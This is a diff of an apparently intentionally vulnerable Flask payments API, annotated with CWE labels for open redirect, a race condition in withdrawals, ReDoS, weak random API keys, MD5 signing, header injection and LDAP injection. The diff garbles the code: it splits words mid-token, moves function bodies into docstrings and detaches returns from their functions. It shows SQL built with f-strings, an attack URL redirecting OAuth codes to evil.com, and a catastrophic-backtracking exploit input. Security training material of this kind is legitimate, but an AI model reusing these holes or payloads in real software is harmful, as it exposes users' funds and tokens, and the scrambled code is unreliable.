@@ -52,17 +52,6 @@ def import_payments_xml():
 # VULNERABILITY: CWE-601 — Open Redirect
 # =====================================================================
 
-@app.route('/api/auth/callback', methods=['GET'])
-def oauth_callback():
-    """
-    CRITICAL — CWE-601: Open Redirect
-
-    The 'redirect_uri' parameter is not validated against an allowlist.
-    Attacker: /api/auth/callback?redirect_uri=https://evil.com/steal-token
-    """
-    code = request.args.get('code', '')
-    redirect_uri = request.args.get('redirect_uri', '/')
-
     # VULNERABLE: no validation — attacker controls the redirect destination
     # Could be used to steal OAuth tokens via a malicious redirect
     return redirect(redirect_uri + f"?code={code}")
@@ -118,18 +107,24 @@ def withdraw():
     balance = db.execute(
         f"SELECT balance FROM wallets WHERE user_id = {user_id}"
     ).fetchone()
-
-    if balance and balance['balance'] >= amount:
-        # Another request can pass the check above before this UPDATE runs
-        time.sleep(0.1)  # simulates processing delay that widens the race window
-
-        db.execute(
-            f"UPDATE wallets SET balance = balance - {amount} WHERE user_id = {user_id}"
-        )
         db.commit()
         return jsonify({'status': 'withdrawn', 'amount': amount})
 
     return jsonify({'error': 'Insufficient funds'}), 400
+
+
+
+@app.route('/api/auth/callback', methods=['GET'])
+def oauth_callback():
+    """
+    CRITICAL — CWE-601: Open Redirect
+
+    The 'redirect_uri' parameter is not validated against an allowlist.
+    Attacker: /api/auth/callback?redirect_uri=https://evil.com/steal-token
+    """
+    code = request.args.get('code', '')
+    redirect_uri = request.args.get('redirect_uri', '/')
+
 
 
 # =====================================================================
@@ -173,6 +168,16 @@ def validate_email():
 
     Catastrophic backtracking on crafted input.
     Exploit: "a" * 30 + "!"
+
+    
+
+    if balance and balance['balance'] >= amount:
+        # Another request can pass the check above before this UPDATE runs
+        time.sleep(0.1)  # simulates processing delay that widens the race window
+
+        db.execute(
+            f"UPDATE wallets SET balance = balance - {amount} WHERE user_id = {user_id}"
+        )
     """
     email = request.get_json().get('email', '')
 
@@ -228,7 +233,15 @@ def generate_api_key():
     API keys generated with Python's `random` module (Mersenne Twister)
     which is predictable — not cryptographically secure.
     """
-    # VULNERABLE: random.choice is NOT cryptographically secure
+    # VULNERABLE: random.choi
+
+
+    """
+    CRITICAL — CWE-327: Use of a Broken Cryptographic Algorithm
+    CRITICAL — CWE-798: Hardcoded Signing Key
+
+    Uses MD5 for payment integrity — trivially forgeable.
+    """ce is NOT cryptographically secure
     charset = string.ascii_letters + string.digits
     api_key = 'sk_' + ''.join(random.choice(charset) for _ in range(32))
 
@@ -257,18 +270,7 @@ def set_locale():
 
     resp = make_response(jsonify({'locale': lang}))
 
-    # VULNERABLE: raw user input in header value — enables header injection
-    resp.headers['Content-Language'] = lang
-
-    return resp
-
-
-# =====================================================================
-# VULNERABILITY: CWE-90 — LDAP Injection
-# =====================================================================
-
-@app.route('/api/directory/search', methods=['GET'])
-@require_auth
+    # VULNERABLE: raw user
 def ldap_search():
     """
     CRITICAL — CWE-90: LDAP Injection
@@ -296,6 +298,21 @@ def ldap_search():
 
 @app.route('/api/auth/verify-otp', methods=['POST'])
 def verify_otp():
+
+
+
+     input in header value — enables header injection
+    resp.headers['Content-Language'] = lang
+
+    return resp
+
+
+# =====================================================================
+# VULNERABILITY: CWE-90 — LDAP Injection
+# =====================================================================
+
+@app.route('/api/directory/search', methods=['GET'])
+@require_auth
     """
     CRITICAL — CWE-770: Allocation of Resources Without Limits
 
